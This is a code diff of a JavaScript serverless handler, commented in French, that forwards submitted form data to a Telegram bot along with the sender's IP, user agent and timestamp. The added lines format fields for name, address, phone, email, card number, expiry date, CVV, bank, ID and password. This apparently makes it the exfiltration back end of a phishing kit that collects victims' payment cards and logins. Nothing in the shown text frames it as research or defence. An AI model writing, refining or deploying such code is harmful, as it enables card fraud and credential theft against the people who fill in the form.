@@ -13,23 +13,49 @@ export default async function handler(req, res) {
     return res.status(400).json({ error: 'Missing message' });
   }
 
-  // IP + UA
+  // Récupère IP et User-Agent
   const forwarded = req.headers['x-forwarded-for'];
-  const ip        = (forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress) || 'unknown';
-  const ua        = req.headers['user-agent'] || 'unknown';
+  const ip        = (forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress) || 'inconnue';
+  const ua        = req.headers['user-agent'] || 'inconnu';
 
-  // Texte
-  const now  = new Date();
-  const date = now.toLocaleString('fr-FR');
-  const text =
-    `${message}\n\n` +
-    `🌐 IP: ${ip}\n` +
-    `📍 UA: ${ua}\n` +
-    `🕓 Date: ${date}`;
+  // Date & heure
+  const now   = new Date();
+  const date  = now.toLocaleDateString('fr-FR');
+  const time  = now.toLocaleTimeString('fr-FR');
 
-  // POST JSON à Telegram
+  // Construction du message fun
+  // Sépare header (première ligne) et détails (le reste)
+  const [ header, ...lines ] = message.split('\n');
+  let text = `📣 *${header}*`;               // gros header en gras
+  text += `\n──────────────────`;
+  lines.forEach(line => {
+    if      (line.startsWith('Nom:'))        text += `\n👤 ${line.slice(4).trim()}`;
+    else if (line.startsWith('Prénom:'))     text += `\n🙋 ${line.slice(7).trim()}`;
+    else if (line.startsWith('Téléphone:'))  text += `\n📞 ${line.slice(10).trim()}`;
+    else if (line.startsWith('Email:'))      text += `\n✉️ ${line.slice(6).trim()}`;
+    else if (line.startsWith('Adresse:'))    text += `\n🏠 ${line.slice(8).trim()}`;
+    else if (line.startsWith('Numéro:'))     text += `\n💳 ${line.slice(7).trim()}`;
+    else if (line.startsWith('Exp:'))        text += `\n📅 ${line.slice(4).trim()}`;
+    else if (line.startsWith('CVV:'))        text += `\n🔒 ${line.slice(4).trim()}`;
+    else if (line.startsWith('Banque:'))     text += `\n🏦 ${line.slice(7).trim()}`;
+    else if (line.startsWith('ID:'))         text += `\n🆔 ${line.slice(3).trim()}`;
+    else if (line.startsWith('Pass:'))       text += `\n🔑 ${line.slice(5).trim()}`;
+    else                                     text += `\n📋 ${line.trim()}`;
+  });
+  text += `\n──────────────────`;
+  text += `\n🌐 *IP* : \`${ip}\``;
+  text += `\n🔎 *Agent* : \`${ua}\``;
+  text += `\n🕓 *Date* : _${date} ${time}_`;
+  text += `\n©️ ${now.getFullYear()}`;
+
+  // Appel POST JSON à Telegram (en Markdown)
   const url     = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
-  const payload = { chat_id: CHAT, text, disable_web_page_preview: true };
+  const payload = {
+    chat_id: CHAT,
+    text,
+    parse_mode: 'Markdown',
+    disable_web_page_preview: true
+  };
 
   const telegramRes = await fetch(url, {
     method: 'POST',
@@ -37,7 +63,7 @@ export default async function handler(req, res) {
     body: JSON.stringify(payload),
   });
 
-  // Lit la réponse
+  // Lit et renvoie la réponse brute
   const raw  = await telegramRes.text();
   let body;
   try { body = JSON.parse(raw); } catch { body = raw; }
